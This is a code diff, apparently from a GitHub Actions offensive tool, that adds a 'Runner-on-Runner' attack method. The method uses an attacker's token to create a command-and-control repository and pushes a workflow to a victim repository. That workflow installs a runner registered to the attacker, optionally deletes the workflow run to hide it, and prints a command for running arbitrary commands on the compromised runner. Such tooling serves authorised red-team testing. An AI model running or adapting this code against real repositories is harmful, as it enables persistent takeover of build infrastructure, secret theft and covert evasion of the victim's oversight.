@@ -611,3 +611,172 @@ class Attacker:
             Output.error(
                 "The user does not have the necessary scopes to conduct this "
                 "attack!")
+
+    def runner_on_runner_attack(
+            self,
+            target_repo: str,
+            attacker_pat: str,
+            attacker_repo_name: str,
+            runner_version: str,
+            target_branch: str,
+            commit_message: str,
+            delete_action: bool,
+            yaml_name: str = "sh_cicd_attack"):
+        """Runner-on-Runner attack: installs a GitHub Actions runner on a
+        compromised self-hosted runner, registered to an attacker-controlled
+        repo for persistent C2 via workflow_dispatch.
+
+        Args:
+            target_repo (str): Victim repository with self-hosted runner.
+            attacker_pat (str): PAT for the attacker's GitHub account.
+            attacker_repo_name (str): Name for the attacker's C2 repo.
+            runner_version (str): GitHub runner version to install.
+            target_branch (str): Branch to create in victim repo.
+            commit_message (str): Commit message for the malicious workflow.
+            delete_action (bool): Whether to delete the workflow after.
+            yaml_name (str): Name for the workflow YAML file.
+        """
+        self.__setup_user_info()
+
+        if not self.user_perms:
+            return False
+
+        if not (self.capabilities.can_write_contents and
+                self.capabilities.can_write_workflows):
+            Output.error(
+                "The user does not have the necessary scopes to conduct this "
+                "attack!")
+            return False
+
+        Output.info(
+            f"Conducting RoR attack against {Output.bright(target_repo)} as "
+            f"the user: {Output.bright(self.user_perms['user'])}!"
+        )
+
+        # Create separate Api instance for attacker operations
+        attacker_api = Api(
+            attacker_pat,
+            socks_proxy=self.socks_proxy,
+            http_proxy=self.http_proxy,
+            github_url=self.github_url,
+        )
+
+        # Validate attacker PAT and get username
+        attacker_info = attacker_api.check_user()
+        if not attacker_info:
+            Output.error("Attacker PAT is invalid!")
+            return False
+
+        attacker_user = attacker_info['user']
+        full_repo_name = f"{attacker_user}/{attacker_repo_name}"
+
+        Output.info(
+            f"Attacker account: {Output.bright(attacker_user)}"
+        )
+
+        # Check if repo exists, create if not
+        repo_check = attacker_api.call_get(
+            f'/repos/{full_repo_name}'
+        )
+
+        created_repo = False
+        if repo_check.status_code == 404:
+            Output.tabbed(
+                f"Creating C2 repo: {Output.bright(full_repo_name)}..."
+            )
+            result = attacker_api.create_repo(attacker_repo_name)
+            if not result:
+                Output.error("Failed to create C2 repo!")
+                return False
+            full_repo_name = result
+            created_repo = True
+            Output.result(f"Created C2 repo: {full_repo_name}")
+        elif repo_check.status_code == 200:
+            Output.info(f"Using existing repo: {full_repo_name}")
+        else:
+            Output.error(
+                f"Failed to check repo: {repo_check.status_code}")
+            return False
+
+        # Push C2 workflow_dispatch workflow if repo was just created
+        if created_repo:
+            Output.tabbed("Pushing C2 workflow_dispatch workflow...")
+            c2_yaml = CICDAttack.create_c2_dispatch_yml()
+            c2_result = attacker_api.commit_workflow(
+                full_repo_name,
+                'main',
+                c2_yaml.encode(),
+                'c2.yml',
+                commit_author=attacker_user,
+                commit_email=f"{attacker_user}@users.noreply.github.com",
+                message="Initial setup"
+            )
+            if not c2_result:
+                Output.error("Failed to push C2 workflow!")
+                return False
+            Output.result("C2 workflow pushed to attacker repo.")
+
+        # Get runner registration token
+        Output.tabbed("Getting runner registration token...")
+        reg_token = attacker_api.get_runner_registration_token(
+            full_repo_name
+        )
+        if not reg_token:
+            Output.error("Failed to get runner registration token!")
+            return False
+        Output.result("Got runner registration token.")
+
+        # Generate RoR payload and workflow
+        if target_branch is None:
+            branch = ''.join(random.choices(
+                string.ascii_lowercase, k=10))
+        else:
+            branch = target_branch
+
+        res = self.api.get_repo_branch(target_repo, branch)
+        if res == -1:
+            Output.error("Failed to check for remote branch!")
+            return
+        elif res == 1:
+            Output.error(f"Remote branch, {branch}, already exists!")
+            return
+
+        yaml_contents = CICDAttack.create_ror_yml(
+            reg_token, full_repo_name, runner_version, branch
+        )
+
+        Output.info("Pushing runner installation workflow to victim repo...")
+
+        workflow_id = self.__execute_and_wait_workflow(
+            target_repo,
+            branch,
+            yaml_contents,
+            commit_message,
+            yaml_name
+        )
+
+        if workflow_id:
+            res = self.api.download_workflow_logs(target_repo, workflow_id)
+            if not res:
+                Output.error("Failed to download logs!")
+            else:
+                Output.result(
+                    f"Workflow logs downloaded to {workflow_id}.zip!"
+                )
+
+        if delete_action and workflow_id:
+            res = self.api.delete_workflow_run(target_repo, workflow_id)
+            if not res:
+                Output.error("Failed to delete workflow!")
+            else:
+                Output.result("Workflow deleted sucesfully!")
+
+        Output.owned("Runner-on-Runner attack complete!")
+        Output.info(
+            f"C2 repo: https://github.com/{full_repo_name}"
+        )
+        Output.info(
+            "To execute commands on the compromised runner:\n"
+            f"  gh workflow run c2.yml -R {full_repo_name} "
+            "-f command=\"whoami\""
+        )
